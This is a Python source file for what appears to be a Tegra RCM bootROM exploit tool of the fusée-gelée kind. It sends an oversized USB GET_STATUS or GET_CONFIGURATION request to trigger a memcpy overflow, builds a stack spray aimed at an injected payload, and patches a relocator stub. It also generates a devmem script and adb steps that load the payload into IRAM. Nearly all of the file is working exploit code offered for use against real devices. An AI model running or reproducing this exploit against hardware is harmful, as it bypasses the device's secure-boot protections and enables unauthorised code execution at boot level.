import os
import platform
import struct
import sys
from abc import ABC

from usb_backend import HaxBackend

class EPHax(ABC):
    debug = False
    IRAM_END = 0x40040000

    # Values to be set per SoC/Hax
    TRIGGER_USB_REQUEST = None
    STACK_END = None

    def __init__(self, arguments, vid, pid):
        self.debug = arguments.debug
        self.pid = pid
        self.vid = vid

        if self.debug:
            print("IRAM_END:" , hex(self.IRAM_END))
            print("VID:" , hex(self.vid))
            print("PID:" , hex(self.pid))

        # Create a vulnerability backend for the given device.
        try:
            self.backend = HaxBackend.create_appropriate_backend(
                system_override=arguments.platform, skip_checks=arguments.skip_checks
            )
        except IOError:
            print("It doesn't look like we support your OS, currently. Sorry about that!\n")
            exit(-1)

        if not self.supported(arguments.platform):
            print("It doesn't look like we support your OS for this SoC, currently. Sorry about that!\n")
            exit(-1)

        # Grab a connection to the USB device itself.
        dev = self.find_device(vid, pid)

        if arguments.override_usb_path is None:
            # If we don't have a device...
            if dev is None:
                # ... and we're allowed to wait for one, wait indefinitely for one to appear...
                if arguments.wait_for_device:
                    print("Waiting for a TegraRCM device to come online...")
                    while dev is None:
                        dev = self.find_device(vid, pid)
    
                # ... or bail out.
                else:
                    raise IOError("No TegraRCM device found?")
    
            #Generate USB path
            self.dev_usb_bus = self.dev_usb_path = str(dev.bus)
            first = True
            for p in dev.port_numbers:
                if first:
                    first = False
                    self.dev_usb_path += "-"
                else:
                    self.dev_usb_path += "."
                self.dev_usb_path += str(p)
        else:
            self.dev_usb_path = arguments.override_usb_path
            self.dev_usb_bus = self.dev_usb_path.split("-")[0]

        if self.debug:
            print(f"USB Device Bus: {self.dev_usb_bus} Path: {self.dev_usb_path}")

        # Print any use-related warnings.
        self.backend.print_warnings()

        # Notify the user of which backend we're using.
        print("Identified a {} system; setting up the appropriate backend.".format(self.backend.BACKEND_NAME))


    def find_device(self, vid=None, pid=None):
        """ Attempts to get a connection to the RCM device with the given VID and PID. """
        return self.backend.find_device(vid, pid)


    def get_current_buffer_address(_self):
        """ Returns the base address for the current usb transfer. """
        raise NotImplementedError("This SoC/Hax must have get_current_buffer_address implemented")


    def upload_payload(_self, _arguments):
        """ Uploads the payload to the device """
        raise NotImplementedError("This SoC/Hax must have upload_payload implemented")


    def get_trigger_length(self, length=None):
        """ Determine how much we'd need to transmit to smash the full stack. """
        if length is None:
            length = self.STACK_END - self.get_current_buffer_address() #  This should work with stack_spray_end, but it doesn'
        return length


    def trigger_controlled_memcpy(self, length=None, request=None):
        """ Triggers the RCM vulnerability, causing it to make a signficantly-oversized memcpy. """

        length = self.get_trigger_length(length)
        if not request:
            request = self.TRIGGER_USB_REQUEST
        
        if self.debug:
            print(f"Sending trigger request {request} of length 0x{length:x}")
        return self.backend.trigger_vulnerability(request, length)


    def supported(self, system_override=None):
        """ Returns true iff the given backend is supported on this platform. """
        raise NotImplementedError("This SoC/Hax must have upload_payload implemented")
    

    def post_trigger(self):
        pass


class RCMHax(EPHax):
    TRIGGER_USB_REQUEST = HaxBackend.GET_STATUS
    USB_XFER_MAX = 0x1000
    # The address where the user payload is expected to begin.
    # A reasonable offset allows Intermezzo to grow without problems
    PAYLOAD_START_OFF  = 0xE40
    
    # Values to be set per SoC
    RCM_HEADER_SIZE = None
    RCM_PAYLOAD_ADDR = None
    COPY_BUFFER_ADDRESSES = None
    STACK_SPRAY_END = None
    STACK_SPRAY_START = None

    def __init__(self, *args, **kwargs):
        """ Set up our RCM hack connection."""

        EPHax.__init__(self, *args, **kwargs)
        
        if self.COPY_BUFFER_ADDRESSES[0] == 0:
            self.COPY_BUFFER_ADDRESSES[0] = self.COPY_BUFFER_ADDRESSES[1]

        if self.debug:
            print("RCM_HEADER_SIZE:" , self.RCM_HEADER_SIZE)
            print("RCM_PAYLOAD_ADDR:" , hex(self.RCM_PAYLOAD_ADDR))
            print("COPY_BUFFER_ADDRESSES:" , hex(self.COPY_BUFFER_ADDRESSES[0]), ", ", hex(self.COPY_BUFFER_ADDRESSES[1]))
            print("STACK_SPRAY_START:" , hex(self.STACK_SPRAY_START))
            print("STACK_SPRAY_END:" , hex(self.STACK_SPRAY_END))
            print("STACK_END:" , hex(self.STACK_END))
            print("PAYLOAD_START_OFF:" , hex(self.PAYLOAD_START_OFF))

        # The first write into the bootROM touches the lowbuffer.
        self.current_buffer = 0

        # Keep track of the total amount written.
        self.total_written = 0

    def read(self, length):
        """ Reads data from the RCM protocol endpoint. """
        return self.backend.read(0x81, length)


    def write(self, data):
        """ Writes data to the main RCM protocol endpoint. """

        length = len(data)
        packet_size = self.USB_XFER_MAX

        while length:
            data_to_transmit = min(length, packet_size)
            length -= data_to_transmit

            chunk = data[:data_to_transmit]
            data  = data[data_to_transmit:]
            self.write_single_buffer(chunk)


    def write_single_buffer(self, data):
        """
        Writes a single RCM buffer, which should be USB_XFER_MAX long.
        The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        If it's not, send a ZLP.
        """
        self._toggle_buffer()
        return self.backend.write(0x01, data)


    def _toggle_buffer(self):
        """
        Toggles the active target buffer, paralleling the operation happening in
        RCM on the X1 device.
        """
        self.current_buffer = 1 - self.current_buffer


    def supported(self, system_override=None):
        return self.backend.supported(system_override)


    def get_current_buffer_address(self):
        """ Returns the base address for the current copy. """
        return self.COPY_BUFFER_ADDRESSES[self.current_buffer]


    def read_device_id(self):
        """ Reads the Device ID via RCM. Only valid at the start of the communication. """
        return self.read(16)


    def switch_to_highbuf(self):
        """ Switches to the higher RCM buffer, reducing the amount that needs to be copied. """

        if self.get_current_buffer_address() != self.COPY_BUFFER_ADDRESSES[1]:
            self.write(b'\0' * self.USB_XFER_MAX)
    
    def upload_payload(self, arguments):
        # Expand out the payload path to handle any user-references.
        payload_path = os.path.expanduser(arguments.payload)
        if not os.path.isfile(payload_path):
            print("Invalid payload path specified!")
            exit(-1)
        
        # Find our intermezzo relocator...
        if arguments.relocator is None:
            arguments.relocator = os.path.join(arguments.current_dir, "intermezzo.bin")
        intermezzo_path = os.path.expanduser(arguments.relocator)
        if not os.path.isfile(intermezzo_path):
            print("Could not find the intermezzo interposer. Did you build it?")
            exit(-1)
    
        # Print the device's ID. Note that reading the device's ID is necessary to get it into RCM.
        try:
            device_id = self.read_device_id()
            print("Found a Tegra with Device ID: {}".format(device_id.hex()))
        except OSError as e:
            # Raise the exception only if we're not being permissive about ID reads.
            if not arguments.permissive_id:
                raise e
    
        # Construct the RCM message which contains the data needed for the exploit.
        rcm_message = self.create_rcm_message(arguments.current_dir, intermezzo_path, payload_path)
    
        # Send the constructed payload, which contains the command, the stack smashing
        # values, the Intermezzo relocation stub, and the final payload.
        print("Uploading payload...")
        self.write(rcm_message)
    
        # The RCM backend alternates between two different DMA buffers. Ensure we're
        # about to DMA into the higher one, so we have less to copy during our attack.
        self.switch_to_highbuf()

    def create_rcm_message(self, current_dir, intermezzo_path, payload_path):
        """ Creates the RCM message containing the payload and stack overwrite"""
######## RCM HEADER ############################################################
        # The max payload size depends on the address of the RCM Payload buffer
        # Add the RCM header size to USB transfer size.
        # Substract 16. IDK they all do it. Test without it.
        rcm_payload_length  = (self.IRAM_END - self.RCM_PAYLOAD_ADDR) + self.RCM_HEADER_SIZE - 16
        if self.debug:
            print("RCM payload length: " , rcm_payload_length)

        rcm_header = rcm_payload_length.to_bytes(4, byteorder='little')
        # Fill up the RCM header to RCM_HEADER_SIZE otherwise the start of the payload is copied to thhexe RCM command buffer
        rcm_header += b'\0' * (self.RCM_HEADER_SIZE - len(rcm_header))


######## DECIDE IF INTERMEZZO IS NEEDED ########################################
        with open(payload_path, "rb") as f:
            payload      = f.read()

        spray_value = self.RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little')
        padding_value = spray_value

        if len(payload) < (self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1]):
            if self.debug:
                print("Payload without intermezzo")
            # skip intermezzo
            rcm_payload = payload

######## PAD UNTIL STACK SPRAY ADDRESS #########################################
            padding_size = (self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1]) - len(rcm_payload)
            if self.debug:
                print("Padding size until stackspray: ", padding_size)
            padding = padding_value * int(padding_size / 4)
            padding += b'\0' * (padding_size % 4)
            rcm_payload += padding

######## STACK SPRAY ADDRESS ###################################################
            repeat_count = int((self.STACK_SPRAY_END - self.STACK_SPRAY_START) / 4)
            if self.debug:
                print("Number of stack sprays: ", repeat_count)
            stack_spray = spray_value * repeat_count
            rcm_payload += stack_spray

        elif len(payload) < ((self.IRAM_END - self.RCM_PAYLOAD_ADDR) - self.PAYLOAD_START_OFF - (self.STACK_SPRAY_END - self.STACK_SPRAY_START)):
            if self.debug:
                print("Payload with intermezzo")
            # The RCM payload needs to contain the stackspray and therefore the actual payload eventually needs to be splitted.
            # Intermezzo will concat it back together
            # Calc sizes for indidual parts
            payload_part1_max_size = self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1] - self.PAYLOAD_START_OFF
            payload_part2_max_size = (self.IRAM_END - self.RCM_PAYLOAD_ADDR) - (self.STACK_SPRAY_END - self.COPY_BUFFER_ADDRESSES[1])

            # Check if payload fits in the available space
            if self.debug:
                print("Payload size before stack spray: ", payload_part1_max_size)
                print("Payload size after stack spray: ", payload_part2_max_size)
                print("Payload size: ", payload_part1_max_size+payload_part2_max_size)
            assert(len(payload) < (payload_part1_max_size+payload_part2_max_size))
######## INTERMEZZO ############################################################
            # This is the start of the RCM payload buffer.
            with open(intermezzo_path, "rb") as f:
                intermezzo      = f.read()

######## PATCH INTERMEZZO ######################################################
            # Intermezzo relocation address
            intermezzo[0x100] = (self.RCM_PAYLOAD_ADDR-0x1000).to_bytes(4, byteorder='little')

            # Payload Entry point
            intermezzo[0x104] = (self.RCM_PAYLOAD_ADDR).to_bytes(4, byteorder='little')

            # Payload start offset
            intermezzo[0x108] = (self.RCM_PAYLOAD_ADDR+self.PAYLOAD_START_OFF).to_bytes(4, byteorder='little')

            # Payload Part 1 size
            intermezzo[0x10C] = payload_part1_max_size.to_bytes(4, byteorder='little')

            # Start of Payload Part 2
            intermezzo[0x110] = payload_part1_max_size.to_bytes(4, byteorder='little')

            # Payload Part 2 size
            intermezzo[0x114] = payload_part1_max_size.to_bytes(4, byteorder='little')

            rcm_payload = intermezzo
            if self.debug:
                with open(os.path.join(current_dir, "intermezzo_patched.bin"), "wb") as f_intermezzo_patched:
                    f_intermezzo_patched.write(intermezzo)
######## PAD UNTIL PAYLOAD ADDRESS #############################################
            # Payload should start at a fixed offset so pad until that offset.
            padding_size = self.PAYLOAD_START_OFF - len(rcm_payload)
            padding = padding_value * int(padding_size / 4)
            rcm_payload += padding

######## APPEND 1st PART OF PAYLOAD ############################################
            # append first part of payload if payload is larger than the available buffer
            payload_part1_size = min(payload_part1_max_size, len(payload))
            rcm_payload += payload[:payload_part1_size]

######## PAD UNTIL STACK SPRAY ADDRESS #########################################
            assert((self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1]) - len(rcm_payload) == 0)

######## STACK SPRAY ADDRESS ###################################################
            repeat_count = int((self.STACK_SPRAY_END - self.STACK_SPRAY_START) / 4)
            stack_spray = spray_value * repeat_count
            rcm_payload += stack_spray

######## APPEND 2nd PART OF PAYLOAD ############################################
            assert(len(payload) - payload_part1_max_size > 0)
            rcm_payload += payload[payload_part1_size:]
        else:
            print("Payload too large :(")
            exit(1)

######## PAD TO USB_XFER_MAX ###################################################
        # Pad the payload to fill a USB request exactly, so we don't send a short
        # packet and lose track of the current usb USB DMA buffer.
        payload_length = len(rcm_header + rcm_payload) #pad the RCM message full USB buffer.
        if (payload_length % self.USB_XFER_MAX) != 0: #don't pad if we already end at correct alignment
            padding_size   = self.USB_XFER_MAX - (payload_length % self.USB_XFER_MAX)
            rcm_payload += padding_value * int(padding_size / 4)
            rcm_payload += b'\0' * (padding_size % 4)

        rcm_message = rcm_header + rcm_payload

        if self.debug:
            with open(os.path.join(current_dir, "rcm_message.bin"), "wb") as f_rcm_message:
                f_rcm_message.write(rcm_message)
            with open(os.path.join(current_dir, "rcm_header.bin"), "wb") as f_rcm_header:
                f_rcm_header.write(rcm_header)
            with open(os.path.join(current_dir, "rcm_payload.bin"), "wb") as f_rcm_payload:
                f_rcm_payload.write(rcm_payload)

        return rcm_message

class IRAMHax(EPHax):
    TRIGGER_USB_REQUEST = HaxBackend.GET_CONFIGURATION

    # List of OSs this Hax supports.
    SUPPORTED_SYSTEMS = ['linux']

    # Values to be set per SoC
    STACK_SPRAY_END = None
    STACK_SPRAY_START = None
    IRAM_EP0_BUFFER_ADDRESS = None
    IRAM_PAYLOAD_ADDR = None

    def __init__(self, arguments, *args, **kwargs):
        """ Set up our IRAM hack connection."""

        EPHax.__init__(self, arguments=arguments, *args, **kwargs)
        
        if not arguments.skip_upload and not arguments.skip_smash:
            print("This SoC must have payload sent manually!\n"
                  "Run this script with --skip-smash first and follow instructions\n")
            exit(1)


    def supported(self, system_override=None):
        # If we have a SYSTEM_OVERRIDE, use it.
        if system_override:
            system = system_override
        else:
            system = platform.system()

        return system.lower() in self.SUPPORTED_SYSTEMS


    def get_current_buffer_address(self):
        """ Returns the base address for the current copy. """
        return self.IRAM_EP0_BUFFER_ADDRESS


    def linux_get_usb_sysfs(self, device, path):
        with open (f"/sys/bus/usb/devices/{device}/{path}", "r") as f:
            return f.read()
        
    def get_fusee_smash_cmd(self):
        fusee_cmd = []
        skip_next = False
        for arg in sys.argv:
            if skip_next:
                skip_next = False
                continue
            if arg == "--skip-smash":
                arg = "--skip-upload"
            if arg == "--relocator":
                skip_next = True
                continue
            if arg[0] != '-' or arg in [
                "-w", "-V", "--vid", "-P", "--pid", "--override-os", "--override-checks",
                '--tty', '-o', '--debug', '--override-usb-path', '--skip-upload']:
                fusee_cmd.append(arg)
        fusee_cmd = " ".join(fusee_cmd)
        return fusee_cmd


    def upload_payload(self, arguments):
        # Find our intermezzo relocator...
        if arguments.relocator is None:
            arguments.relocator = os.path.join(arguments.current_dir, "iram_loader.bin")

        # Expand out the payload path to handle any user-references.
        payload_path = os.path.expanduser(arguments.payload)
        if not os.path.isfile(payload_path):
            print("Invalid payload path specified!")
            exit(-1)

        with open(payload_path, "rb") as f:
            payload = f.read()

        bootimg_path = self.generate_bootimg_kernel(arguments, payload)
        self.generate_script(arguments, payload)

        print(f"\n\n\n==> Bootimg method:\n"
              f" Generated bootimg kernel image to load payload in IRAM"
              f" at:\n{bootimg_path}\n"
              f"- Package this as kernel into a bootimg"
              f"- Flash recovery to boot partition"
              f"- Flash the bootimg to recovery partition")

        is_linux = platform.system().lower() in ["linux"]
        is_usb_authorized = is_linux and self.linux_get_usb_sysfs(f"usb{self.dev_usb_bus}", "authorized_default").strip() == "1"
        if is_linux:
            if is_usb_authorized:
                print(f"- Run this command and then (re)boot the flashed bootimg\n"
                      f"(at recovery partition) with USB connected to same computer port:\n"
                      f"echo 0 | sudo tee /sys/bus/usb/devices/usb{self.dev_usb_bus}/authorized_default")
            else:
                print(f"- Boot the flashed bootimg (at recovery partition) with USB connected to computer")

        fusee_cmd = self.get_fusee_smash_cmd()
        print("- Run the following once bootimg puts device in RCM mode to launch the payload:")
        if is_usb_authorized:
            print(f"echo 1 | sudo tee /sys/bus/usb/devices/usb{self.dev_usb_bus}/authorized_default")
        print(fusee_cmd)


    def generate_bootimg_kernel(self, arguments, payload):
        loader_path = os.path.expanduser(arguments.relocator)
        if not os.path.isfile(loader_path):
            print("Could not find the iram loader. Did you build it?")
            exit(-1)
        with open(loader_path, "rb") as f:
            bootimg_kernel = f.read()
        
        bootimg_kernel += struct.pack("<II", 0xC0DE10AD, len(payload))
        bootimg_kernel += payload

        #Write it!
        bootimg_path = os.path.join(arguments.current_dir, "iram_bootimg_kernel.bin")
        with open(bootimg_path, "wb") as f:
            f.write(bootimg_kernel)
            
        return bootimg_path


    def generate_script(self, arguments, payload):
        is_linux = platform.system().lower() in ["linux"]
        is_usb_authorized = is_linux and self.linux_get_usb_sysfs(f"usb{self.dev_usb_bus}", "authorized_default").strip() == "1"
        
        devmem_cmd = "busybox devmem"
        
        #Generate script to write 
        script_text = f"DEVMEM=\"{devmem_cmd}\"\n"

        #Spray for stack
        for addr in range(self.STACK_SPRAY_START, self.STACK_SPRAY_END, 4):
            script_text += f"$DEVMEM 0x{addr:X} 32 0x{self.IRAM_PAYLOAD_ADDR:X}\n"

        #Payload loader
        payload_len = len(payload)
        for written in range(0, payload_len, 8):
            addr = self.IRAM_PAYLOAD_ADDR + written
            left = min(8, payload_len - written)
            data = struct.unpack("<Q", payload[written:written+left] + bytes(8 - left))[0]
            script_text += f"$DEVMEM 0x{addr:X} 64 0x{data:X}\n"
        
        fusee_cmd = self.get_fusee_smash_cmd()

        script_text += "echo \"Finished loading data to IRAM! will enter RCM now...\"\n"
        script_text += "echo \"If after launching this command the device doesn't respond after few seconds reboot it\"\n"
        script_text += "echo \"Run on your computer to continue with exploit:\n\"\n"
        if is_usb_authorized:
            script_text += f"echo \"echo 1 | sudo tee /sys/bus/usb/devices/usb{self.dev_usb_bus}/authorized_default\"\n"
        script_text += f"echo \"{fusee_cmd}\"\n"
        script_text += "sleep 1\n"
        script_text += f"$DEVMEM 0x7000E450 32 0x2\n"
        script_text += f"$DEVMEM 0x7000E400 32 0x10\n"

        #Write it!
        script_path = os.path.join(arguments.current_dir, "iram_payload.sh")
        with open(script_path, "w") as f:
            f.write(script_text)
            
        print(f"\n\n\n==> Script method:\n"
              f"Generated script to load the payload into your device\n"
              f"Please run it in your device (android/recovery) with root user\n"
              f"Don't change USB port the device is connected to while doing these steps!")
        if is_linux:
            print(f"NOTE:  On linux the normal USB enumeration must be stopped to\n"
                  f"avoid SET_CONFIGURATION being sent by setting\n"
                  f"authorized_default on the usb bus {self.dev_usb_bus} as 0\n")
        print(f"Use these commands for that:\n")
        print(f"adb push {script_path} /sdcard/iram_payload.sh")
        if is_usb_authorized:
            print(f"echo 0 | sudo tee /sys/bus/usb/devices/usb{self.dev_usb_bus}/authorized_default")
        print(f"adb shell sh \"/sdcard/iram_payload.sh\""
              f"\n\n-------------------------------------------")


    def read(self, length):
        """ Reads data """
        return self.backend.read(0x81, length)
    
    def trigger_controlled_memcpy(self, length=None, request=None):
        is_linux = platform.system().lower() in ["linux"]
        if is_linux:
            if self.linux_get_usb_sysfs(self.dev_usb_path, "authorized").strip() == "1":
                raise ValueError("Device is authorized! this won't work, follow instructions regarding authorized_default")
        super().trigger_controlled_memcpy(length, request)
